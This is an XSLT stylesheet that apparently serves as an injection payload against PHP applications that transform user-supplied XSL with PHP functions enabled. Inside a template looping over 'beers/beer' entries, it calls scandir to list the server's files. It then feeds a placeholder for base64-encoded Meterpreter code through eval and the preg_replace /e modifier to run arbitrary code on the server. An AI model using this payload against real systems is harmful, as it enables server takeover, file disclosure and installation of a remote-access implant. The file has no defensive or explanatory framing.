<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:for-each select="beers/beer">
  <div style="background-color:teal;color:white;padding:4px">
    <span style="font-weight:bold">
    <xsl:variable name="fd" select="php:function('scandir', '.')" />
    FD = <xsl:value-of select="$fd"/>
    <xsl:variable name="eval">
      eval(base64_decode('Base64-encoded Meterpreter code'))
    </xsl:variable>
    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
    <xsl:value-of select="$preg"/>
    </span>
  </div>
  <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
    <p>
    TEST 1
    <span style="font-style:italic"> (<xsl:value-of select='prct'/> %) </span>
    </p>
  </div>
</xsl:for-each>
</body>
</html> 

